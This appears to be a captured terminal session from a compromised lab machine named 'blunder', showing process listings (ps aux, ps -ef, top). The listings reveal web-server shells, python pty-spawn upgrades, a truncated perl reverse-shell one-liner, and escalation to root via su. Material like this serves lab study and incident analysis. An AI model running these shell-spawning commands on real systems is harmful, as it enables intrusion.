+www-data 12447  0.0  0.0   4216  3344 pts/2    Ss+  21:06   0:00 /bin/bash
+www-data 12946  0.0  0.6 167872 26448 ?        S    22:21   0:00 /usr/sbin/
+www-data 12947  0.0  0.0   2600   848 ?        S    22:21   0:00 sh -c unam
+www-data 12951  0.0  0.0   2600  1756 ?        S    22:21   0:00 /bin/sh -i
+root     13168  0.0  0.0      0     0 ?        I    22:31   0:00 [kworker/1
+www-data 13238  0.0  0.1  10444  7384 ?        S    22:36   0:00 python -c 
+www-data 13239  0.0  0.0   4216  3440 pts/3    Ss   22:36   0:00 /bin/bash
+root     13378  0.0  0.0      0     0 ?        I    22:39   0:00 [kworker/1
+root     13832  0.0  0.0      0     0 ?        I    22:57   0:00 [kworker/u
+www-data 13871  0.2  0.7 167888 28420 ?        S    23:00   0:02 /usr/sbin/
+www-data 13889  0.0  0.0      0     0 ?        Z    23:03   0:00 [sh] <defu
+root     13927  0.0  0.0      0     0 ?        I    23:06   0:00 [kworker/u
+root     14042  0.0  0.0      0     0 ?        I    23:09   0:00 [kworker/0
+www-data 14051  0.0  0.0      0     0 ?        Z    23:09   0:00 [sh] <defu
+root     14080  0.0  0.0      0     0 ?        I    23:12   0:00 [kworker/u
+www-data 14101  1.6  0.6 167692 25768 ?        S    23:14   0:03 /usr/sbin/
+www-data 14106  1.6  0.6 167692 25488 ?        S    23:14   0:03 /usr/sbin/
+www-data 14108  0.1  0.6 167840 26988 ?        S    23:14   0:00 /usr/sbin/
+www-data 14114  0.0  0.0      0     0 ?        Z    23:15   0:00 [sh] <defu
+www-data 14122  0.0  0.0      0     0 ?        Z    23:15   0:00 [sh] <defu
+www-data 14126  0.0  0.0      0     0 ?        Z    23:15   0:00 [sh] <defu
+www-data 14130  1.7  0.6 167692 25344 ?        S    23:15   0:02 /usr/sbin/
+www-data 14132  1.6  0.6 167692 25488 ?        S    23:15   0:01 /usr/sbin/
+www-data 14134  1.6  0.6 167692 25488 ?        S    23:16   0:01 /usr/sbin/
+www-data 14136  1.5  0.6 167692 25488 ?        S    23:16   0:01 /usr/sbin/
+www-data 14137  1.6  0.6 167692 25488 ?        S    23:16   0:01 /usr/sbin/
+www-data 14145  1.6  0.6 167692 25412 ?        S    23:16   0:01 /usr/sbin/
+www-data 14147  1.6  0.6 167692 25428 ?        S    23:16   0:01 /usr/sbin/
+www-data 14148  1.6  0.6 167692 25488 ?        S    23:16   0:01 /usr/sbin/
+www-data 14150  1.6  0.6 167692 25428 ?        S    23:16   0:01 /usr/sbin/
+www-data 14151  1.6  0.6 167692 25424 ?        S    23:16   0:00 /usr/sbin/
+www-data 14156  0.0  0.0   2600   848 ?        S    23:17   0:00 sh -c /bin
+www-data 14157  0.0  0.0   2600   848 ?        S    23:17   0:00 /bin/sh
+www-data 14159  1.5  0.6 167692 25488 ?        S    23:17   0:00 /usr/sbin/
+www-data 14160  1.5  0.6 167692 25484 ?        S    23:17   0:00 /usr/sbin/
+root     14161  0.0  0.0      0     0 ?        I    23:17   0:00 [kworker/u
+www-data 14162  0.0  0.0   5852  2864 pts/3    R+   23:17   0:00 ps aux
+
+
+
+
+
+
+
+
+
+
+
+
+
+www-data@blunder:/$ ps -ef
+UID        PID  PPID  C STIME TTY          TIME CMD
+root         1     0  0 16:46 ?        00:00:03 /sbin/init splash
+root         2     0  0 16:46 ?        00:00:00 [kthreadd]
+root         3     2  0 16:46 ?        00:00:00 [rcu_gp]
+root         4     2  0 16:46 ?        00:00:00 [rcu_par_gp]
+root         6     2  0 16:46 ?        00:00:00 [kworker/0:0H-kblockd]
+root         9     2  0 16:46 ?        00:00:00 [mm_percpu_wq]
+root        10     2  0 16:46 ?        00:00:15 [ksoftirqd/0]
+root        11     2  0 16:46 ?        00:00:14 [rcu_sched]
+root        12     2  0 16:46 ?        00:00:00 [migration/0]
+root        13     2  0 16:46 ?        00:00:00 [idle_inject/0]
+root        14     2  0 16:46 ?        00:00:00 [cpuhp/0]
+root        15     2  0 16:46 ?        00:00:00 [cpuhp/1]
+root        16     2  0 16:46 ?        00:00:00 [idle_inject/1]
+root        17     2  0 16:46 ?        00:00:00 [migration/1]
+root        18     2  0 16:46 ?        00:00:03 [ksoftirqd/1]
+root        20     2  0 16:46 ?        00:00:00 [kworker/1:0H-kblockd]
+root        21     2  0 16:46 ?        00:00:00 [kdevtmpfs]
+root        22     2  0 16:46 ?        00:00:00 [netns]
+root        23     2  0 16:46 ?        00:00:00 [rcu_tasks_kthre]
+root        24     2  0 16:46 ?        00:00:00 [kauditd]
+root        25     2  0 16:46 ?        00:00:00 [khungtaskd]
+root        26     2  0 16:46 ?        00:00:00 [oom_reaper]
+root        27     2  0 16:46 ?        00:00:00 [writeback]
+root        28     2  0 16:46 ?        00:00:00 [kcompactd0]
+root        29     2  0 16:46 ?        00:00:00 [ksmd]
+root        30     2  0 16:46 ?        00:00:00 [khugepaged]
+root       123     2  0 16:46 ?        00:00:00 [kintegrityd]
+root       124     2  0 16:46 ?        00:00:00 [kblockd]
+root       125     2  0 16:46 ?        00:00:00 [blkcg_punt_bio]
+root       126     2  0 16:46 ?        00:00:00 [tpm_dev_wq]
+root       127     2  0 16:46 ?        00:00:00 [ata_sff]
+root       128     2  0 16:46 ?        00:00:00 [md]
+root       129     2  0 16:46 ?        00:00:00 [edac-poller]
+root       130     2  0 16:46 ?        00:00:00 [devfreq_wq]
+root       131     2  0 16:46 ?        00:00:00 [watchdogd]
+root       134     2  0 16:46 ?        00:00:01 [kswapd0]
+root       135     2  0 16:46 ?        00:00:00 [kworker/u5:0]
+root       136     2  0 16:46 ?        00:00:00 [ecryptfs-kthrea]
+root       139     2  0 16:46 ?        00:00:00 [kthrotld]
+root       140     2  0 16:46 ?        00:00:00 [irq/24-pciehp]
+root       141     2  0 16:46 ?        00:00:00 [irq/25-pciehp]
+root       142     2  0 16:46 ?        00:00:00 [irq/26-pciehp]
+root       143     2  0 16:46 ?        00:00:00 [irq/27-pciehp]
+root       144     2  0 16:46 ?        00:00:00 [irq/28-pciehp]
+root       145     2  0 16:46 ?        00:00:00 [irq/29-pciehp]
+root       146     2  0 16:46 ?        00:00:00 [irq/30-pciehp]
+root       147     2  0 16:46 ?        00:00:00 [irq/31-pciehp]
+root       148     2  0 16:46 ?        00:00:00 [irq/32-pciehp]
+root       149     2  0 16:46 ?        00:00:00 [irq/33-pciehp]
+root       150     2  0 16:46 ?        00:00:00 [irq/34-pciehp]
+root       151     2  0 16:46 ?        00:00:00 [irq/35-pciehp]
+root       152     2  0 16:46 ?        00:00:00 [irq/36-pciehp]
+root       153     2  0 16:46 ?        00:00:00 [irq/37-pciehp]
+root       154     2  0 16:46 ?        00:00:00 [irq/38-pciehp]
+root       155     2  0 16:46 ?        00:00:00 [irq/39-pciehp]
+root       156     2  0 16:46 ?        00:00:00 [irq/40-pciehp]
+root       157     2  0 16:46 ?        00:00:00 [irq/41-pciehp]
+root       158     2  0 16:46 ?        00:00:00 [irq/42-pciehp]
+root       159     2  0 16:46 ?        00:00:00 [irq/43-pciehp]
+root       160     2  0 16:46 ?        00:00:00 [irq/44-pciehp]
+root       161     2  0 16:46 ?        00:00:00 [irq/45-pciehp]
+root       162     2  0 16:46 ?        00:00:00 [irq/46-pciehp]
+root       163     2  0 16:46 ?        00:00:00 [irq/47-pciehp]
+root       164     2  0 16:46 ?        00:00:00 [irq/48-pciehp]
+root       165     2  0 16:46 ?        00:00:00 [irq/49-pciehp]
+root       166     2  0 16:46 ?        00:00:00 [irq/50-pciehp]
+root       167     2  0 16:46 ?        00:00:00 [irq/51-pciehp]
+root       168     2  0 16:46 ?        00:00:00 [irq/52-pciehp]
+root       169     2  0 16:46 ?        00:00:00 [irq/53-pciehp]
+root       170     2  0 16:46 ?        00:00:00 [irq/54-pciehp]
+root       171     2  0 16:46 ?        00:00:00 [irq/55-pciehp]
+root       172     2  0 16:46 ?        00:00:00 [acpi_thermal_pm]
+root       173     2  0 16:46 ?        00:00:00 [scsi_eh_0]
+root       174     2  0 16:46 ?        00:00:00 [scsi_tmf_0]
+root       175     2  0 16:46 ?        00:00:00 [scsi_eh_1]
+root       176     2  0 16:46 ?        00:00:00 [scsi_tmf_1]
+root       179     2  0 16:46 ?        00:00:00 [ipv6_addrconf]
+root       190     2  0 16:46 ?        00:00:00 [kstrp]
+root       209     2  0 16:46 ?        00:00:00 [charger_manager]
+root       260     2  0 16:46 ?        00:00:00 [scsi_eh_2]
+root       261     2  0 16:46 ?        00:00:00 [scsi_tmf_2]
+root       262     2  0 16:46 ?        00:00:00 [scsi_eh_3]
+root       263     2  0 16:46 ?        00:00:00 [scsi_tmf_3]
+root       264     2  0 16:46 ?        00:00:00 [scsi_eh_4]
+root       265     2  0 16:46 ?        00:00:00 [scsi_tmf_4]
+root       266     2  0 16:46 ?        00:00:00 [scsi_eh_5]
+root       267     2  0 16:46 ?        00:00:00 [scsi_tmf_5]
+root       268     2  0 16:46 ?        00:00:00 [scsi_eh_6]
+root       269     2  0 16:46 ?        00:00:00 [scsi_tmf_6]
+root       270     2  0 16:46 ?        00:00:00 [scsi_eh_7]
+root       271     2  0 16:46 ?        00:00:00 [scsi_tmf_7]
+root       272     2  0 16:46 ?        00:00:00 [scsi_eh_8]
+root       273     2  0 16:46 ?        00:00:00 [scsi_tmf_8]
+root       274     2  0 16:46 ?        00:00:00 [scsi_eh_9]
+root       275     2  0 16:46 ?        00:00:00 [scsi_tmf_9]
+root       276     2  0 16:46 ?        00:00:00 [scsi_eh_10]
+root       277     2  0 16:46 ?        00:00:00 [scsi_tmf_10]
+root       278     2  0 16:46 ?        00:00:00 [scsi_eh_11]
+root       279     2  0 16:46 ?        00:00:00 [scsi_tmf_11]
+root       280     2  0 16:46 ?        00:00:00 [scsi_eh_12]
+root       281     2  0 16:46 ?        00:00:00 [scsi_tmf_12]
+root       282     2  0 16:46 ?        00:00:00 [scsi_eh_13]
+root       283     2  0 16:46 ?        00:00:00 [scsi_tmf_13]
+root       284     2  0 16:46 ?        00:00:00 [scsi_eh_14]
+root       285     2  0 16:46 ?        00:00:00 [scsi_tmf_14]
+root       286     2  0 16:46 ?        00:00:00 [scsi_eh_15]
+root       287     2  0 16:46 ?        00:00:00 [scsi_tmf_15]
+root       288     2  0 16:46 ?        00:00:00 [scsi_eh_16]
+root       289     2  0 16:46 ?        00:00:00 [scsi_tmf_16]
+root       290     2  0 16:46 ?        00:00:00 [scsi_eh_17]
+root       291     2  0 16:46 ?        00:00:00 [scsi_tmf_17]
+root       292     2  0 16:46 ?        00:00:00 [scsi_eh_18]
+root       293     2  0 16:46 ?        00:00:00 [scsi_tmf_18]
+root       294     2  0 16:46 ?        00:00:00 [scsi_eh_19]
+root       295     2  0 16:46 ?        00:00:00 [scsi_tmf_19]
+root       296     2  0 16:46 ?        00:00:00 [scsi_eh_20]
+root       297     2  0 16:46 ?        00:00:00 [scsi_tmf_20]
+root       298     2  0 16:46 ?        00:00:00 [scsi_eh_21]
+root       299     2  0 16:46 ?        00:00:00 [scsi_tmf_21]
+root       300     2  0 16:46 ?        00:00:00 [scsi_eh_22]
+root       301     2  0 16:46 ?        00:00:00 [scsi_tmf_22]
+root       302     2  0 16:46 ?        00:00:00 [scsi_eh_23]
+root       303     2  0 16:46 ?        00:00:00 [scsi_tmf_23]
+root       304     2  0 16:46 ?        00:00:00 [scsi_eh_24]
+root       305     2  0 16:46 ?        00:00:00 [scsi_tmf_24]
+root       306     2  0 16:46 ?        00:00:00 [scsi_eh_25]
+root       307     2  0 16:46 ?        00:00:00 [scsi_tmf_25]
+root       308     2  0 16:46 ?        00:00:00 [scsi_eh_26]
+root       309     2  0 16:46 ?        00:00:00 [scsi_tmf_26]
+root       310     2  0 16:46 ?        00:00:00 [scsi_eh_27]
+root       311     2  0 16:46 ?        00:00:00 [scsi_tmf_27]
+root       312     2  0 16:46 ?        00:00:00 [scsi_eh_28]
+root       313     2  0 16:46 ?        00:00:00 [scsi_tmf_28]
+root       314     2  0 16:46 ?        00:00:00 [scsi_eh_29]
+root       315     2  0 16:46 ?        00:00:00 [scsi_tmf_29]
+root       316     2  0 16:46 ?        00:00:00 [scsi_eh_30]
+root       317     2  0 16:46 ?        00:00:00 [scsi_tmf_30]
+root       318     2  0 16:46 ?        00:00:00 [scsi_eh_31]
+root       319     2  0 16:46 ?        00:00:00 [scsi_tmf_31]
+root       347     2  0 16:46 ?        00:00:00 [kworker/0:1H-kblockd]
+root       348     2  0 16:46 ?        00:00:01 [kworker/1:1H-kblockd]
+root       351     2  0 16:46 ?        00:00:00 [kdmflush]
+root       352     2  0 16:46 ?        00:00:00 [kdmflush]
+root       396     2  0 16:46 ?        00:00:01 [jbd2/dm-0-8]
+root       397     2  0 16:46 ?        00:00:00 [ext4-rsv-conver]
+root       450     1  0 16:46 ?        00:00:02 /lib/systemd/systemd-journa
+root       458     2  0 16:46 ?        00:00:00 bpfilter_umh
+root       469     1  0 16:46 ?        00:00:01 /lib/systemd/systemd-udevd
+root       488     2  0 16:46 ?        00:00:00 [irq/16-vmwgfx]
+root       490     2  0 16:46 ?        00:00:00 [loop0]
+root       492     2  0 16:46 ?        00:00:00 [ttm_swap]
+root       506     2  0 16:46 ?        00:00:00 [loop1]
+root       511     2  0 16:46 ?        00:00:00 [loop2]
+root       513     2  0 16:46 ?        00:00:00 [loop3]
+root       526     2  0 16:46 ?        00:00:00 [loop4]
+root       530     1  0 16:46 ?        00:00:00 vmware-vmblock-fuse /run/vm
+root       535     2  0 16:46 ?        00:00:00 [loop5]
+root       548     2  0 16:46 ?        00:00:00 [loop6]
+root       550     2  0 16:46 ?        00:00:00 [loop7]
+root       586     2  0 16:46 ?        00:00:00 [loop8]
+root       587     2  0 16:46 ?        00:00:00 [loop9]
+root       588     2  0 16:46 ?        00:00:00 [loop10]
+root       593     2  0 16:46 ?        00:00:00 [loop11]
+root       594     2  0 16:46 ?        00:00:00 [loop12]
+root       598     2  0 16:46 ?        00:00:00 [loop13]
+root       599     2  0 16:46 ?        00:00:00 [loop14]
+root       600     2  0 16:46 ?        00:00:00 [loop15]
+systemd+   642     1  0 16:46 ?        00:00:02 /lib/systemd/systemd-timesy
+root       643     1  0 16:46 ?        00:00:00 /usr/bin/VGAuthService
+systemd+   645     1  0 16:46 ?        00:00:03 /lib/systemd/systemd-resolv
+root       648     1  0 16:46 ?        00:00:23 /usr/bin/vmtoolsd
+root       716     2  0 16:46 ?        00:00:00 [cryptd]
+root       903     1  0 16:46 ?        00:00:00 /usr/sbin/acpid
+root       909     1  0 16:46 ?        00:00:00 /usr/lib/udisks2/udisksd
+syslog     910     1  0 16:46 ?        00:00:00 /usr/sbin/rsyslogd -n -iNON
+root       911     1  0 16:46 ?        00:00:00 /lib/systemd/systemd-logind
+root       916     1  0 16:46 ?        00:00:00 /usr/sbin/irqbalance --fore
+root       917     1  0 16:46 ?        00:00:00 /usr/bin/python3 /usr/bin/n
+message+   921     1  0 16:46 ?        00:00:03 /usr/bin/dbus-daemon --syst
+root       926     1  0 16:46 ?        00:00:00 /sbin/wpa_supplicant -u -s 
+root       928     1  0 16:46 ?        00:00:03 /usr/sbin/NetworkManager --
+root       935     1  0 16:46 ?        00:00:00 /usr/lib/accountsservice/ac
+root       938     1  0 16:46 ?        00:00:04 /usr/lib/snapd/snapd
+root       939     1  0 16:46 ?        00:00:00 /usr/sbin/cron -f
+root       942     1  0 16:46 ?        00:00:00 /usr/sbin/ModemManager --fi
+avahi      946     1  0 16:46 ?        00:00:00 avahi-daemon: running [blun
+avahi     1019   946  0 16:46 ?        00:00:00 avahi-daemon: chroot helper
+root      1022     1  0 16:46 ?        00:00:00 /usr/sbin/cups-browsed
+root      1026     1  0 16:46 ?        00:00:01 /usr/lib/policykit-1/polkit
+root      1081     1  0 16:46 ?        00:00:00 /usr/sbin/gdm3
+root      1091     1  0 16:46 ?        00:00:05 /usr/sbin/apache2 -k start
+root      1137     1  0 16:46 ?        00:00:00 /usr/sbin/cupsd -l
+lp        1142  1137  0 16:46 ?        00:00:00 /usr/lib/cups/notifier/dbus
+root      1148     1  0 16:46 ?        00:00:00 /usr/bin/python3 /usr/share
+root      1151  1081  0 16:46 ?        00:00:00 gdm-session-worker [pam/gdm
+shaun     1178     1  0 16:46 ?        00:00:00 /lib/systemd/systemd --user
+shaun     1179  1178  0 16:46 ?        00:00:00 (sd-pam)
+shaun     1193  1178  0 16:46 ?        00:00:00 /usr/bin/pulseaudio --daemo
+shaun     1196     1  0 16:46 ?        00:00:00 /usr/bin/gnome-keyring-daem
+shaun     1200  1151  0 16:46 tty2     00:00:00 /usr/lib/gdm3/gdm-x-session
+shaun     1202  1200  0 16:46 tty2     00:00:02 /usr/lib/xorg/Xorg vt2 -dis
+rtkit     1279     1  0 16:46 ?        00:00:00 /usr/libexec/rtkit-daemon
+shaun     1285  1178  0 16:46 ?        00:00:00 /usr/bin/dbus-daemon --sess
+shaun     1291  1200  0 16:46 tty2     00:00:00 /usr/lib/gnome-session/gnom
+shaun     1359  1291  0 16:46 ?        00:00:00 /usr/bin/ssh-agent /usr/bin
+shaun     1379  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfsd
+shaun     1384  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfsd-fuse /r
+shaun     1409  1178  0 16:46 ?        00:00:00 /usr/lib/at-spi2-core/at-sp
+shaun     1414  1409  0 16:46 ?        00:00:00 /usr/bin/dbus-daemon --conf
+shaun     1423  1178  0 16:46 ?        00:00:00 /usr/lib/at-spi2-core/at-sp
+shaun     1433  1178  0 16:46 ?        00:00:00 /usr/libexec/xdg-desktop-po
+shaun     1438  1178  0 16:46 ?        00:00:00 /usr/libexec/xdg-document-p
+shaun     1441  1178  0 16:46 ?        00:00:00 /usr/libexec/xdg-permission
+shaun     1450  1178  0 16:46 ?        00:00:00 /usr/libexec/xdg-desktop-po
+shaun     1460  1178  0 16:46 ?        00:00:00 /usr/lib/dconf/dconf-servic
+shaun     1471  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-session/gnom
+shaun     1477  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-session/gnom
+whoopsie  1489     1  0 16:46 ?        00:00:00 /usr/bin/whoopsie -f
+kernoops  1491     1  0 16:46 ?        00:00:00 /usr/sbin/kerneloops --test
+kernoops  1493     1  0 16:46 ?        00:00:00 /usr/sbin/kerneloops
+shaun     1505  1178  0 16:46 ?        00:00:30 /usr/bin/gnome-shell
+shaun     1531  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-shell/gnome-
+shaun     1535  1178  0 16:46 ?        00:00:00 /usr/libexec/evolution-sour
+shaun     1544  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-online-accou
+root      1547     1  0 16:46 ?        00:00:00 /usr/lib/upower/upowerd
+shaun     1555  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-online-accou
+shaun     1567  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfs-udisks2-
+shaun     1572  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfs-gphoto2-
+shaun     1576  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfs-goa-volu
+shaun     1580  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfs-afc-volu
+shaun     1585  1178  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfs-mtp-volu
+shaun     1607  1505  0 16:46 ?        00:00:00 ibus-daemon --panel disable
+shaun     1629  1607  0 16:46 ?        00:00:00 /usr/lib/ibus/ibus-memconf
+shaun     1630  1607  0 16:46 ?        00:00:02 /usr/lib/ibus/ibus-extensio
+shaun     1633  1379  0 16:46 ?        00:00:00 /usr/lib/gvfs/gvfsd-trash -
+shaun     1635  1178  0 16:46 ?        00:00:00 /usr/lib/ibus/ibus-x11 --ki
+shaun     1640  1178  0 16:46 ?        00:00:00 /usr/lib/ibus/ibus-portal
+shaun     1654  1178  0 16:46 ?        00:00:00 /usr/libexec/evolution-cale
+shaun     1670  1178  0 16:46 ?        00:00:00 /usr/libexec/evolution-addr
+shaun     1680  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1681  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1682  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1683  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1684  1178  0 16:46 ?        00:00:02 /usr/lib/gnome-settings-dae
+shaun     1686  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1695  1178  0 16:46 ?        00:00:01 /usr/lib/gnome-settings-dae
+shaun     1696  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1700  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1704  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1705  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1706  1178  0 16:46 ?        00:00:02 /usr/lib/gnome-settings-dae
+shaun     1707  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1711  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1712  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1715  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+shaun     1723  1477  0 16:46 ?        00:00:00 /usr/libexec/evolution-data
+shaun     1733  1178  0 16:46 ?        00:01:01 /usr/bin/vmtoolsd -n vmusr 
+shaun     1740  1477  0 16:46 ?        00:00:00 /usr/lib/tracker/tracker-mi
+shaun     1742  1477  0 16:46 ?        00:00:00 /usr/lib/gnome-disk-utility
+shaun     1828  1178  0 16:46 ?        00:00:00 /usr/lib/gnome-settings-dae
+colord    1832     1  0 16:46 ?        00:00:00 /usr/lib/colord/colord
+shaun     1859  1607  0 16:46 ?        00:00:00 /usr/lib/ibus/ibus-engine-s
+www-data  2002     1  0 16:47 ?        00:00:00 /bin/sh
+www-data  2025  2002  0 16:47 ?        00:00:00 python -c import pty;pty.sp
+www-data  2026  2025  0 16:47 pts/0    00:00:00 /bin/bash
+shaun     2046  1178  0 16:47 ?        00:00:00 /usr/lib/gvfs/gvfsd-metadat
+shaun     2049  1477  0 16:47 ?        00:00:00 update-notifier
+shaun     2070  1477  0 16:47 ?        00:00:02 /usr/bin/gnome-software --g
+root      2086     1  0 16:47 ?        00:00:00 /usr/lib/bolt/boltd
+root      2100  2026  0 16:47 pts/0    00:00:00 su hugo
+hugo      2120     1  0 16:47 ?        00:00:00 /lib/systemd/systemd --user
+hugo      2121  2120  0 16:47 ?        00:00:00 (sd-pam)
+hugo      2141  2120  0 16:47 ?        00:00:00 /usr/bin/pulseaudio --daemo
+hugo      2142  2100  0 16:47 pts/0    00:00:00 bash
+hugo      2151  2120  0 16:47 ?        00:00:00 /usr/bin/dbus-daemon --sess
+root      2153  2142  0 16:48 pts/0    00:00:00 /bin/bash
+www-data  3405  1091  0 19:11 ?        00:00:20 /usr/sbin/apache2 -k start
+www-data  3472  3405  0 19:22 ?        00:00:00 [sh] <defunct>
+www-data 11517  3405  0 19:27 ?        00:00:00 [sh] <defunct>
+www-data 11540  3405  0 19:30 ?        00:00:00 sh -c /bin/sh 
+www-data 11541 11540  0 19:30 ?        00:00:00 /bin/sh
+www-data 11570 11541  0 19:31 ?        00:00:00 python -c import pty;pty.sp
+www-data 11571 11570  0 19:31 pts/1    00:00:00 bin/bash
+root     11821 11571  0 19:43 pts/1    00:00:00 su hugo
+hugo     11822 11821  0 19:43 pts/1    00:00:00 bash
+root     11997 11822  0 19:46 pts/1    00:00:00 /bin/bash
+www-data 12014  1091  0 19:51 ?        00:00:11 /usr/sbin/apache2 -k start
+root     12148     2  0 20:09 ?        00:00:04 [kworker/0:1-events]
+www-data 12211  1091  0 20:12 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 12213  1091  0 20:13 ?        00:00:33 /usr/sbin/apache2 -k start
+www-data 12426 12211  0 20:49 ?        00:00:00 [sh] <defunct>
+www-data 12428     1  0 20:49 ?        00:00:00 perl -MIO -e $p=fork();exit
+www-data 12441 12014  0 21:04 ?        00:00:00 sh -c /bin/sh 
+www-data 12442 12441  0 21:04 ?        00:00:00 /bin/sh
+www-data 12446 12442  0 21:06 ?        00:00:00 python -c import pty;pty.sp
+www-data 12447 12446  0 21:06 pts/2    00:00:00 /bin/bash
+www-data 12946  1091  0 22:21 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 12947 12946  0 22:21 ?        00:00:00 sh -c uname -a; w; id; /bin
+www-data 12951 12947  0 22:21 ?        00:00:00 /bin/sh -i
+root     13168     2  0 22:31 ?        00:00:00 [kworker/1:1-events]
+www-data 13238 12951  0 22:36 ?        00:00:00 python -c import pty;pty.sp
+www-data 13239 13238  0 22:36 pts/3    00:00:00 /bin/bash
+root     13378     2  0 22:39 ?        00:00:00 [kworker/1:0-events]
+root     13832     2  0 22:57 ?        00:00:00 [kworker/u4:2-events_unboun
+www-data 13871  1091  0 23:00 ?        00:00:02 /usr/sbin/apache2 -k start
+www-data 13889 13871  0 23:03 ?        00:00:00 [sh] <defunct>
+root     13927     2  0 23:06 ?        00:00:00 [kworker/u4:1-events_power_
+root     14042     2  0 23:09 ?        00:00:00 [kworker/0:2-events]
+www-data 14051 13871  0 23:09 ?        00:00:00 [sh] <defunct>
+root     14080     2  0 23:12 ?        00:00:00 [kworker/u4:3-events_freeza
+www-data 14101  1091  1 23:14 ?        00:00:05 /usr/sbin/apache2 -k start
+www-data 14108  1091  0 23:14 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 14114 13871  0 23:15 ?        00:00:00 [sh] <defunct>
+www-data 14122 13871  0 23:15 ?        00:00:00 [sh] <defunct>
+www-data 14126 14108  0 23:15 ?        00:00:00 [sh] <defunct>
+www-data 14130  1091  1 23:15 ?        00:00:03 /usr/sbin/apache2 -k start
+www-data 14132  1091  1 23:15 ?        00:00:03 /usr/sbin/apache2 -k start
+www-data 14136  1091  1 23:16 ?        00:00:03 /usr/sbin/apache2 -k start
+www-data 14137  1091  1 23:16 ?        00:00:03 /usr/sbin/apache2 -k start
+www-data 14148  1091  1 23:16 ?        00:00:02 /usr/sbin/apache2 -k start
+www-data 14156 14108  0 23:17 ?        00:00:00 [sh] <defunct>
+root     14161     2  0 23:17 ?        00:00:00 [kworker/u4:0-events_unboun
+www-data 14163  1091  1 23:17 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14164  1091  1 23:17 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14166  1091  1 23:17 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14169  1091  1 23:18 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14170  1091  1 23:18 ?        00:00:01 /usr/sbin/apache2 -k start
+www-data 14171  1091  1 23:18 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 14172 14108  0 23:18 ?        00:00:00 sh -c /bin/sh 
+www-data 14173 14172  0 23:18 ?        00:00:00 /bin/sh
+www-data 14174  1091  1 23:19 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 14175  1091  1 23:19 ?        00:00:00 /usr/sbin/apache2 -k start
+www-data 14176 14132  0 23:19 ?        00:00:00 sh -c /bin/sh 
+www-data 14177 14176  0 23:19 ?        00:00:00 /bin/sh
+www-data 14179 13239  0 23:19 pts/3    00:00:00 ps -ef
+
+
+www-data@blunder:/$ top
+top - 23:20:13 up  6:34,  1 user,  load average: 0.51, 0.38, 0.95
+Tasks: 334 total,   1 running, 323 sleeping,   0 stopped,  10 zombie
+%Cpu(s):  8.5 us,  1.5 sy,  0.0 ni, 89.6 id,  0.0 wa,  0.0 hi,  0.3 si,  0.
+MiB Mem :   3936.1 total,    916.4 free,    907.8 used,   2112.0 buff/cache
+MiB Swap:    976.0 total,    975.7 free,      0.3 used.   2731.1 avail Mem 
+
+  PID USER      PR  NI    VIRT    RES    SHR S  %CPU  %MEM     TIME+ 
+14175 www-data  20   0  167692  25488  13348 S   2.0   0.6   0:01.00 
+14185 www-data  20   0  167692  25488  13348 S   2.0   0.6   0:00.73 
+14187 www-data  20   0  167692  25424  13288 S   2.0   0.6   0:00.69 
+14101 www-data  20   0  167696  25772  13628 S   1.7   0.6   0:06.12 
+14163 www-data  20   0  167692  25428  13288 S   1.7   0.6   0:02.32 
+14171 www-data  20   0  167692  25488  13348 S   1.7   0.6   0:01.78 
+14182 www-data  20   0  167692  25488  13348 S   1.7   0.6   0:00.75 
+14166 www-data  20   0  167692  25428  13288 S   1.3   0.6   0:02.34 
+14180 www-data  20   0  167692  25488  13348 S   1.3   0.6   0:00.86 
+14184 www-data  20   0  167692  25456  13316 S   1.3   0.6   0:00.70 
+14189 www-data  20   0  167692  25348  13216 S   1.3   0.6   0:00.05 
+14136 www-data  20   0  167692  25488  13348 S   1.0   0.6   0:03.94 
+14186 www-data  20   0  167692  25268  13132 S   1.0   0.6   0:00.78 
+14188 www-data  20   0    6460   3732   2836 R   0.3   0.1   0:00.02 
+    1 root      20   0  167236  11136   8008 S   0.0   0.3   0:03.31 
+    2 root      20   0       0      0      0 S   0.0   0.0   0:00.01 
+    3 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 
+    4 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 
+    6 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 
+    9 root       0 -20       0      0      0 I   0.0   0.0   0:00.00 
+   10 root      20   0       0      0      0 S   0.0   0.0   0:15.80 
+   11 root      20   0       0      0      0 I   0.0   0.0   0:14.82 
